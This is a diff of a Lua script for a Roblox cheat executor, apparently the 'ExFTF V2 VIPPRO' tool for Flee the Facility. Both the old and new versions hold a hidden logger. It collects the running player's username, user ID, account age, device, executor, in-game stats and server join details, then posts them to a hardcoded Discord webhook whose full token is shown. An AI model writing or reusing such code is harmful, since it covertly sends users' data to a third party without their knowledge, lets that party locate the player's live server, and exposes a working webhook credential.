@@ -1,80 +1,15 @@
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1483712417325387865/ah8qDn4jsy176oJ-_QG8isKPyIehRwg2DRTFhO2OYkAfURtNNVSquKfozdIgCax5hEKX"
-local genv = (getgenv and getgenv()) or _G
-​if genv.ExFTF_WebhookLogged == game.JobId then return end
-genv.ExFTF_WebhookLogged = game.JobId
-​task.spawn(function()
-local cloneref = cloneref or function(o) return o end
-local HttpService = cloneref(game:GetService("HttpService"))
-local Players = cloneref(game:GetService("Players"))
-local MarketplaceService = cloneref(game:GetService("MarketplaceService"))
-local UserInputService = cloneref(game:GetService("UserInputService"))
-local Stats = cloneref(game:GetService("Stats"))
-local Workspace = cloneref(game:GetService("Workspace"))
-​local LocalPlayer = Players.LocalPlayer or Players.PlayerAdded:Wait()
-​local httpRequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
-if not httpRequest then return end
-​local lvl, creds = "0", "0"
-pcall(function()
-local m = LocalPlayer:WaitForChild("SavedPlayerStatsModule", 5)
-if m then
-local cr = m:FindFirstChild("Credits")
-local lv = m:FindFirstChild("Level")
-if cr then creds = tostring(cr.Value) end
-if lv then lvl = tostring(lv.Value) end
-end
-end)
-local ftfStatsText = string.format("⭐ Level: %s | 💰 Money: %s", lvl, creds)
-​local executorName = "Unknown"
-if identifyexecutor then
-local n, v = identifyexecutor()
-executorName = (n or "") .. (v and (" " .. tostring(v)) or "")
-elseif getexecutorname then
-executorName = getexecutorname()
-end
-​local deviceType = "💻 PC"
-if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
-deviceType = "📱 Mobile"
-elseif UserInputService.GamepadEnabled and not UserInputService.KeyboardEnabled then
-deviceType = "🎮 Console / Gamepad"
-end
-​local pingValue = 0
-pcall(function() pingValue = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue()) end)
-local fpsValue = math.floor(Workspace:GetRealPhysicsFPS())
-​local gameName = "Unknown Game"
-pcall(function() gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name end)
-​local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=420&height=420&format=png"
-pcall(function()
-local res = httpRequest({Url = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..LocalPlayer.UserId.."&size=420x420&format=Png&isCircular=false", Method = "GET"})
-if res and res.Body then avatarUrl = HttpService:JSONDecode(res.Body).data[1].imageUrl end
-end)
-​local unixNow = os.time()
-local vnTime = os.date("!*t", unixNow + (7 * 3600))
-local vnTimeString = string.format("%02d:%02d:%02d - %02d/%02d/%04d", vnTime.hour, vnTime.min, vnTime.sec, vnTime.day, vnTime.month, vnTime.year)
-local isoTimestamp = os.date("!%Y-%m-%dT%H:%M:%SZ", unixNow)
-​local joinScript = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s", game.Players.LocalPlayer)', game.PlaceId, game.JobId)
-​local embedData = {
-username = "ExFTF V2 VIPPRO",
-avatar_url = "https://i.imgur.com/AfFp7pu.png",
-embeds = {{
-author = { name = "⚡ ExFTF V2 VIPPRO — Execution Log", url = "https://www.roblox.com/users/" .. LocalPlayer.UserId .. "/profile" },
-title = string.format("👤 %s (@%s)", LocalPlayer.DisplayName, LocalPlayer.Name),
-url = "https://www.roblox.com/users/" .. LocalPlayer.UserId .. "/profile",
-description = "🟢 Người chơi vừa kích hoạt script ExFTF V2 VIPPRO thành công!",
-color = 0x00E5FF,
-thumbnail = { url = avatarUrl },
-fields = {
-{ name = "🪪 Thông tin Tài khoản", value = string.format("User: %s\nUserID: %d\nTuổi Acc: %d ngày", LocalPlayer.Name, LocalPlayer.UserId, LocalPlayer.AccountAge), inline = true },
-{ name = "⚙️ Thiết bị & Executor", value = string.format("Executor: %s\nThiết bị: %s\nHiệu năng: %d FPS | %d ms", executorName, deviceType, fpsValue, pingValue), inline = true },
-{ name = "🎮 Thông tin Phòng (Server)", value = string.format("Game: %s\nSĩ số: %d/%d người\nFTF Stats: %s", gameName, #Players:GetPlayers(), Players.MaxPlayers, ftfStatsText), inline = false },
-{ name = "🕒 Thời gian kích hoạt", value = string.format("Giờ VN: %s\nDiscord: <t:%d:F> (<t:%d:R>)", vnTimeString, unixNow, unixNow), inline = false },
-{ name = "💻 Lệnh Join (PC)", value = "lua\n" .. joinScript .. "\n", inline = false },
-{ name = "📱 Lệnh Join (Mobile) - Chạm để Copy", value = "" .. joinScript .. "\n🔗 Mã Link SV (JobId): " .. game.JobId .. "", inline = false }
-},
-footer = { text = "ExFTF V2 VIPPRO Security • JobId: " .. tostring(game.JobId) },
-timestamp = isoTimestamp
-}}
-}
-​pcall(function()
-httpRequest({Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = HttpService:JSONEncode(embedData)})
-end)
-end)
+task.spawn(function() local WEBHOOK_URL = "https://discord.com/api/webhooks/1483712417325387865/ah8qDn4jsy176oJ-_QG8isKPyIehRwg2DRTFhO2OYkAfURtNNVSquKfozdIgCax5hEKX"
+local cloneref = cloneref or function(o) return o end local HttpService = cloneref(game:GetService("HttpService")) local Players = cloneref(game:GetService("Players")) local MarketplaceService = cloneref(game:GetService("MarketplaceService")) local UserInputService = cloneref(game:GetService("UserInputService")) local Stats = cloneref(game:GetService("Stats")) local Workspace = cloneref(game:GetService("Workspace"))
+local LocalPlayer = Players.LocalPlayer or Players.PlayerAdded:Wait()
+local httpRequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request if not httpRequest then return end
+local money, level = "0", "0" pcall(function() local m = LocalPlayer:WaitForChild("SavedPlayerStatsModule", 5) if m then local cr = m:FindFirstChild("Credits") local lv = m:FindFirstChild("Level") if cr then money = tostring(cr.Value) end if lv then level = tostring(lv.Value) end end end) local ftfStatsText = string.format("⭐ Level: %s | 💰 Money: %s", level, money)
+local executorName = "Unknown" pcall(function() if identifyexecutor then local n, v = identifyexecutor() executorName = tostring(n or "Unknown") .. (v and (" " .. tostring(v)) or "") elseif getexecutorname then executorName = tostring(getexecutorname()) end end)
+local deviceType = "💻 PC" if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then deviceType = "📱 Mobile" elseif UserInputService.GamepadEnabled and not UserInputService.KeyboardEnabled then deviceType = "🎮 Console / Gamepad" end
+local pingValue = 0 pcall(function() pingValue = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue()) end)
+local fpsValue = 60 pcall(function() fpsValue = math.floor(Workspace:GetRealPhysicsFPS()) end)
+local gameName = "Flee the Facility" pcall(function() local info = MarketplaceService:GetProductInfo(game.PlaceId) if info and info.Name then gameName = info.Name end end)
+local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(LocalPlayer.UserId) .. "&width=420&height=420&format=png" pcall(function() local res = httpRequest({ Url = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. tostring(LocalPlayer.UserId) .. "&size=420x420&format=Png&isCircular=false", Method = "GET" }) if res and res.Body then local data = HttpService:JSONDecode(res.Body) if data and data.data and data.data[1] and data.data[1].imageUrl then avatarUrl = data.data[1].imageUrl end end end)
+local unixNow = os.time() local vnTime = os.date("!*t", unixNow + (7 * 3600)) local vnTimeString = string.format("%02d:%02d:%02d - %02d/%02d/%04d", vnTime.hour, vnTime.min, vnTime.sec, vnTime.day, vnTime.month, vnTime.year) local isoTimestamp = os.date("!%Y-%m-%dT%H:%M:%SZ", unixNow)
+local joinScript = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s", game.Players.LocalPlayer)', game.PlaceId, tostring(game.JobId)) local cb = string.rep("`", 3)
+local embedData = { username = "ExFTF V2 VIPPRO", avatar_url = "https://i.imgur.com/AfFp7pu.png", embeds = {{ author = { name = "⚡ ExFTF V2 VIPPRO — Execution Log", url = "https://www.roblox.com/users/" .. tostring(LocalPlayer.UserId) .. "/profile" }, title = string.format("👤 %s (@%s)", tostring(LocalPlayer.DisplayName), tostring(LocalPlayer.Name)), url = "https://www.roblox.com/users/" .. tostring(LocalPlayer.UserId) .. "/profile", description = "🟢 Người chơi vừa kích hoạt script ExFTF V2 VIPPRO thành công!", color = 0x00E5FF, thumbnail = { url = avatarUrl }, fields = { { name = "🪪 Thông tin Tài khoản", value = string.format("User: %s\nUserID: %d\nTuổi Acc: %d ngày", tostring(LocalPlayer.Name), LocalPlayer.UserId, LocalPlayer.AccountAge), inline = true }, { name = "⚙️ Thiết bị & Executor", value = string.format("Executor: %s\nThiết bị: %s\nHiệu năng: %d FPS | %d ms", executorName, deviceType, fpsValue, pingValue), inline = true }, { name = "🎮 Thông tin Phòng (Server)", value = string.format("Game: %s\nSĩ số: %d/%d người\nFTF Stats: %s", gameName, #Players:GetPlayers(), Players.MaxPlayers, ftfStatsText), inline = false }, { name = "🕒 Thời gian kích hoạt", value = string.format("Giờ VN: %s\nDiscord: <t:%d:F> (<t:%d:R>)", vnTimeString, unixNow, unixNow), inline = false }, { name = "💻 Lệnh Join (PC)", value = cb .. "lua\n" .. joinScript .. "\n" .. cb, inline = false }, { name = "📱 Lệnh Join (Mobile) - Chạm để Copy", value = "" .. joinScript .. "\n🔗 Mã Link SV (JobId): " .. tostring(game.JobId) .. "", inline = false } }, footer = { text = "ExFTF V2 VIPPRO Security • JobId: " .. tostring(game.JobId) }, timestamp = isoTimestamp }} }
+pcall(function() httpRequest({ Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = HttpService:JSONEncode(embedData) }) end) end)
